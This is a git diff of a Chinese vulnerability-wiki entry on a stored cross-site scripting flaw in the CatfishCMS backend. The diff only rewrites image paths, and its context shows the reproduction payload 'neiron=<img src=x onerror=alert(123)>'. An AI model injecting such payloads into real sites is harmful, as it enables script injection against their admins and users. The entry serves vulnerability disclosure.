@@ -13,10 +13,10 @@ CatfishCMS后台储存型xss
 三、复现过程
 ------------
 
-![](/Users/aresx/Documents/VulWiki/.resource/CatfishCMS后台储存型xss/media/rId24.png)
+![](./.resource/CatfishCMS后台储存型xss/media/rId24.png)
 
     neiron=<img src=x onerror=alert(123)>
 
-![](/Users/aresx/Documents/VulWiki/.resource/CatfishCMS后台储存型xss/media/rId25.png)
+![](./.resource/CatfishCMS后台储存型xss/media/rId25.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/CatfishCMS后台储存型xss/media/rId26.png)
+![](./.resource/CatfishCMS后台储存型xss/media/rId26.png)
